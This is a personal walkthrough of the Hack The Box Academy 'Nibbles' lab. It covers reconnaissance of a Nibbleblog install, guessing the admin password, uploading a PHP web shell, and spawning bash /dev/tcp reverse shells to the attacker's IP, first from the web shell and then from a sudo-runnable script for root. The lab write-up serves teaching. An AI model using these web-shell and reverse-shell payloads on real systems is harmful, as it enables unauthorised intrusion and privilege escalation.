module: getting started
section: attacking your first box
url: https://academy.hackthebox.com/module/77/section/850 ff.

i first ran `nmap 10.10.10.75 -sC -sV -p- --min-rate 1000 -oA nibbles-nmap`. this reveils two open ports, with http and ssh services running on their default ports. plus, i get a nice output file for future reference.

> the official writeup states that it would be beneficial to stay away from the `-sC` flag for now (because it's intrusive) and only run it on the ports we are interested in at a later point in time. also, scanning all 65k ports with `-p-` should be saved for a later point in time.
>
> therefore, a better approach would be to...
>
> - run `nmap 10.10.10.75 -sV -oA nibbles-nmap` to begin with
> - then `nmap 10.10.10.75 -sV -oA nibbles-nmap-full -p-` to scan the full range of ports with
> - and finally `nmap 10.10.10.75 -sV -oA nibbles-nmap -sC -p22,80`

i then accessed the website through the browser. just a simple hello world page. the source code reveils an interesting comment:

```
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

browsing to this directory reveals an empty blog

as suggested by the academy writeup, i now did some banner grabbing with `nc -nv 10.10.10.75 22` and `80` respectively. The SSH service on port 22 serves a banner (`SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2`) but the http service does not.

i then ran the nmap scan-script `http-enum` with `nmap -sV --script=http-enum -p22,80 -oA nibbles-nmap-http-enum 10.10.10.75`

next i further did recon/web footprinting on the webserver with whatweb, both on the root and the `nibbleblog` route. in order to pipe the output to a file with `tee` and remove all color coding, i used the flag `--color=never`, e.g. `whatweb 10.10.10.75 -v --color=never | tee whatweb-root`

```
WhatWeb report for http://10.10.10.75
Status    : 200 OK
Title     : <None>
IP        : 10.10.10.75
Country   : RESERVED, ZZ

Summary   : Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and
        maintain an open-source HTTP server for modern operating
        systems including UNIX and Windows NT. The goal of this
        project is to provide a secure, efficient and extensible
        server that provides HTTP services in sync with the current
        HTTP standards.

        Version      : 2.4.18 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to
        identify the operating system from the server header.

        OS           : Ubuntu Linux
        String       : Apache/2.4.18 (Ubuntu) (from server string)

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Thu, 21 Dec 2023 17:26:20 GMT
        Server: Apache/2.4.18 (Ubuntu)
        Last-Modified: Thu, 28 Dec 2017 20:19:50 GMT
        ETag: "5d-5616c3cf7fa77-gzip"
        Accept-Ranges: bytes
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 96
        Connection: close
        Content-Type: text/html
```

coming back to the discovery of the `/nibbleblog` direcory, i then enumerated the directory with gobuster

```
$ obuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.75/nibbleblog/ | tee dir-enum-nibbleblog
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 306]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/.htaccess            (Status: 403) [Size: 306]
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

the `/admin`-route sounds promising, so i tried bruteforcing the admin login with burp's intruder, but it turns out that nibbleblog will blacklist your ip after a certain amount of failed logins. this will keep you banned for about five minutes.

this gives us time to search for `nibbleblog vulnerabilities` with dearchsploit and on the web.

```
$ searchsploit nibbleblog
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                            | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                             | php/remote/38489.rb
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

we don't know which version we are running, so i poked around in the other folders. it turns out that the subfolders don't have an `index.html` that would protect them from exposing their contents in the browser:

![Plugins Folder - Contents](<images/2023-12-21 htb-academy-nibble/plugins-contents.png>)

poking around in the themes folder reveals some indication of the version running in the file `http://10.10.10.75/nibbleblog/themes/echo/config.bit` stating:

```
'Echo', 'description'=>'Original Echo theme updated for NB 4.0', 'notes'=>'Fully responsive, Disqus and Facebook commments supported, replace logo image with your own in themes/echo/css/img/logo.png', 'author'=>'Paulo Nunes', 'version'=>'4.0', 'last_update'=>'05/02/2014', // dd/mm/yyyy 'url'=>'http://www.syndicatefx.com', // http://xxxxxxxxxxxxx 'version_supported'=>array('4.0', '4.0.1') // Nibbleblog version supported ); ?>
```

so it seems to be some nibbleblog v4.x.

it turns out that i missed the most obvious place to look at. the `/README` resource which reveals the version as `v4.0.3`:

```
$ curl http://10.10.10.75/nibbleblog/README

====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

... SNIP ...
```

so let's proceed with that `Arbitrary File Upload` exploit and see if the machine is vulnerable to it.

running the `metasploit console` with `msfconsole`, then `use exploit exploit/multi/http/nibbleblog_file_upload` and `show options` tells us that we need a username and password to proceed. i'll be refering to the academy writeup for further details, as i'm out of ideas at this point.

... great, looks like i was on the right track. the next goal is to find the login credentials. there seems to be a `user.xml`` file somewhere in the directories. let's poke around and find it... and there it is:

```
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">5</session_fail_count>
    <session_date type="integer">1703241530</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
  <blacklist type="string" ip="10.10.14.34">
    <date type="integer">1703241529</date>
    <fail_count type="integer">5</fail_count>
  </blacklist>
</users>
```

it appears that this last entry is my blacklist entry, as it lists the ip of my machine, as checked with `ip a` for `tun0`. the first entry seems to be for the admin account, so we know that there is a user named `admin`. great!

i also poked around in the `/admin/` folder. there are some interesting files:

- http://10.10.10.75/nibbleblog/admin/ajax/security.bit
- http://10.10.10.75/nibbleblog/admin/ajax/uploader.php
- http://10.10.10.75/nibbleblog/admin/ajax/uploader (copy).php (which sounds interesting, but throws a php error, like the other uploader does)

back to the writeup, we can see that at this point we know the following:

- a nibbleblog install potentially vulnerable to an authenticated file upload vulnerability
- an admin portal at nibbleblog/admin.php
- directory listing which confirmed that admin is a valid username
- login brute-forcing protection blacklists our ip address after too many invalid login attempts. this takes login brute-forcing with a tool such as hydra off the table

duh... as the writeup mentions, the `config.xml` file found earlier contains the word nibbles as both the blog name as well as the admin's email address. also, the lab is named "Nibbles". worth a shot, to try the combination admin:nibbles as username/password. and in deed: we're in!

![Admin Dashboard with admin:nibbles](<images/2023-12-21 htb-academy-nibble/admin-dashboard.png>)

if this hadn't worked, using a tool like CeWL (https://github.com/digininja/CeWL) could be a good approach, taken that we have access to so many hidden files and directories already.

so here are the steps we took so far:

- we started with a simple nmap scan showing two open ports
- discovered an instance of nibbleblog
- analyzed the technologies in use using whatweb
- found the admin login portal page at admin.php
- discovered that directory listing is enabled and browsed several directories
- confirmed that admin was the valid username
- found out the hard way that ip blacklisting is enabled to prevent brute-force login attempts
- uncovered clues that led us to a valid admin password of nibbles

with this information, we can now configure our exploit to get a foothold.

using metasploit to execute the file upload would be feasible (and worth a try at a later point) i went ahead and followed the guide. looking around the admin panel we stumble across a plugin called My Image which allows us to upload files. here, we can try to upload a php script to see if we can get remote code execution. i created `do.php` locally with the content of `<?php echo system('id'); ?>` and uploaded it. this results in a bunch of warnings in the web interface, but chances are that the file was indeed uploaded. going back to the directories we have discovered earlier, we can find a `image.php` file in `http://10.10.10.75/nibbleblog/content/private/plugins/my_image`. open it an notice how we have established remote code execution. the server responds with

```
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler) uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

now, let's update our script to establish a remote shell. i edit `do.php` to contain:

```
<?php echo system('bash -c \'bash -i >& /dev/tcp/10.10.14.34/1337 0>&1\''); ?>
```

then listen for incoming connections with

```
nc -lnvp 1337
```

upload the file and open it in the browser or curl it:

```
listening on [any] 1337 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.75] 58540
bash: cannot set terminal process group (1372): Inappropriate ioctl for device
bash: no job control in this shell
<ml/nibbleblog/content/private/plugins/my_image$ whoami
nibbler
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
```

there we go. let's further enumerate! the goal is to achieve privilege escalation!

but first, let's upgrade our shell to a full tty (learn more at https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/):

`$ python -c 'import pty; pty.spawn("/bin/bash")'`

this does not work, as python appears to be missing from the system. `which python3`, however, reveals that python 3 is installed and we can try to run the same command with python 3, instead:

`$ python3 -c 'import pty; pty.spawn("/bin/bash")'`

tadaaa! now, let's navigate to the users home directory and poke around. we find a `user.txt` which contains the user flag!

there is also a file called `personal.zip`. i first moved it to the image directory where the webserver uploaded my php file to, and then downloaded it locally through the browser, for documentation purposes. obviously, it much easier to simply unzip it on the target machine with `unzip personal.zip`. inside, there is a script called `monitor.sh`.

```
$ cat monitor.sh

                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

... SNIP ...
```

running it on the target machine gives us this output:

```
TERM environment variable not set.
tput: No value for $TERM and no -T specified
Internet:  Disconnected
Operating System Type : GNU/Linux
OS Name :Ubuntu
UBUNTU_CODENAME=xenial
OS Version :16.04.3 LTS (Xenial Xerus)
Architecture : x86_64
Kernel Release : 4.4.0-104-generic
Hostname : Nibbles
Internal IP : 10.10.10.75 dead:beef::250:56ff:feb9:3edc
External IP :
Name Servers : DO 10.10.10.2
Logged In users :
Ram Usages :
              total        used        free      shared  buff/cache   available
Mem:           974M        255M        207M         10M        511M        534M
Swap Usages :
              total        used        free      shared  buff/cache   available
Swap:          1.0G          0B        1.0G
Disk Usages :
Filesystem                    Size  Used Avail Use% Mounted on
/dev/sda1                     472M  133M  330M  29% /boot
Load Average : average:0.00,0.00,
System Uptime Days/(HH:MM) : 24 min
```

this seems not very useful right now. i'll put it aside for now to further follow up the academy guide.

`LinEnum.sh` should be used to scan for possible escalation vectors. the shell script is available at https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

i tried to download it directly to the target machine with wget, which obviously doesn't work as the machine has no internet access (due to it being contained in the htb vpn). another option is to download it locally to the attack machine and then make it available through a webserver.

```
$ get https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh --connect-timeout=3
...
$ sudo python3 -m http.server 8080
```

then, on the target machine

```
$ wget http://10.10.14.5:8080/LinEnum.sh
...
$ chmod +x LinEnum.sh
$ ./LinEnum.sh

... SNIP ...

[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh

... SNIP ...
```

this tells us that we can, in fact, run the monitor.sh script as sudo. any monitor.sh script, no matter what it does... we can use this to escalate, by appending our attack to the end of the file!

> it is crucial if we ever encounter a situation where we can leverage a writeable file for privilege escalation. we only append to the end of the file (after making a backup copy of the file) to avoid overwriting it and causing a disruption.

we can basically use the same approach as before and open a reverse shell to out waiting nc-listener. let's provide one on our attacking vm with `nc -lnvp 4711`.

then, let's append the reverse shell connection to the `monitor.sh` script

```
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4711 0>&1'" >> monitor.sh
echo "bash -c 'bash -i >& /dev/tcp/10.10.15.13/4711 0>&1'" >> monitor.sh
```

and finally run it with

```
sudo ./monitor.sh
```

once the reverse shell has connected to our listener, the flag is in `~/root.txt`.

done!
